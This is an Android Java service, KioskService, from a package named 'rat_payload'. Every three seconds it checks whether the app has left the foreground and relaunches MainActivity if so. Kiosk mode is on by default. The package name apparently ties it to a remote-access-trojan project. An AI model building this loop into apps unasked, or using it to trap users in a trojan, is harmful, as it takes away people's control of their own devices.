package com.app.rat_payload;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;

import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Created by anirudh on 12/20/16.
 *
 *
 * Background service to restart app if it ever goes to background.
 */

public class KioskService extends Service {


    // periodic interval to check in seconds -> 3 seconds
    private static final long INTERVAL = TimeUnit.SECONDS.toMillis(3);
    private static final String TAG = KioskService.class.getSimpleName();
    private static final String PREF_KIOSK_MODE = "pref_kiosk_mode";

    private Thread t = null;
    private Context ctx = null;
    private boolean running = false;

    /**
     * On Destroy
     *
     */
    @Override
    public void onDestroy() {
        Log.i(TAG, "Stopping service 'KioskService'");
        running = false;
        super.onDestroy();
    }

    /**
     *
     * On Start
     *
     *
     * @param intent
     * @param flags
     * @param startId
     * @return
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Starting service 'KioskService'");
        running = true;
        ctx = this;

        t = new Thread(new Runnable() {
            @Override
            public void run() {

                do {
                    handleKioskMode();
                    try {
                        Thread.sleep(INTERVAL);

                    } catch (InterruptedException ie) {
                        Log.i(TAG, "THREAD INTERUPPTION: KIOSK SERVICE");
                    }
                } while (running);
                stopSelf();
            }
        });

        t.start();
        return Service.START_NOT_STICKY; //Don't automatically restart if the service is killed.
    }


    /**
     * Restore App from Kiosk
     *
     *
     */
    private void handleKioskMode() {
        if(isKioskModeActive(ctx)) {
            if(isInBackground()) {
                //restore app
                restoreApp();
            }
        }
    }

    /**
     * Check if app in background.
     *
     *
     * @return
     */
    private boolean isInBackground() {
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> taskInfo = am.getRunningTasks(1);
        ComponentName componentInfo = taskInfo.get(0).topActivity;

        return (!ctx.getApplicationContext().getPackageName().equals(componentInfo.getPackageName()));

    }

    /**
     * Start Main Activity
     */
    private void restoreApp() {
        Intent startMain = new Intent(ctx, MainActivity.class);
        startMain.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(startMain);
    }

    /**
     *  Check if Kiosk mode is active.
     *
     *
     * @param context
     * @return
     */
    private boolean isKioskModeActive(final Context context) {
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
        return sp.getBoolean(PREF_KIOSK_MODE, true);
    }

    //Removed nullable.
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



}
